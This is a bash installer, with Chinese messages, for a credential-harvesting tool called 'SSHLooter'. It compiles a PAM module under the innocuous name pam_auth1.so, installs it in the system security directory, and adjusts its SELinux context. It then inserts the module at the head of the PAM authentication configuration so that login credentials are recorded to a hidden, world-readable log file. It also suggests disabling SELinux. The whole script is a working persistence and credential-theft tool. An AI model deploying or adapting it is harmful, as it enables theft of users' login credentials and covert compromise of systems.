#!/bin/bash
echo "[+] SSHLooter 本地记录版 一键部署 - CentOS/RHEL/Rocky/AlmaLinux"

# 1. 编译
if [ -f "looter.c" ]; then
    echo "[*] 正在编译 looter.c ..."
    gcc -fPIC -shared -o pam_auth1.so looter.c -lpam
    if [ $? -ne 0 ]; then
        echo "[-] 编译失败，请检查 looter.c"
        exit 1
    fi
    echo "[√] 编译完成 → pam_auth1.so"
else
    echo "[!] 未找到 looter.c，请确保文件存在"
    exit 1
fi

# 2. 复制模块
sudo cp pam_auth1.so /lib64/security/pam_auth1.so

# 3. SELinux 上下文修复（RHEL/CentOS 必须）
if command -v chcon >/dev/null 2>&1; then
    sudo chcon -t lib_t /lib64/security/pam_auth1.so 2>/dev/null || true
    echo "[*] 已应用 SELinux 上下文 lib_t"
fi

# 4. 添加到 PAM 配置
sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.so' /etc/pam.d/common-auth

# 5. 设置权限
sudo chmod 644 /lib64/security/pam_auth1.so

# 6. 创建日志文件
sudo touch /var/log/.auth1.log
sudo chmod 644 /var/log/.auth1.log
sudo chown root:root /var/log/.auth1.log

echo "[√] 部署完成！登录凭证已记录到 /var/log/.auth1.log"
echo "    查看命令：tail -f /var/log/.auth1.log"
echo "    注意：如遇 SELinux 阻挡，可临时执行：setenforce 0（测试用）"
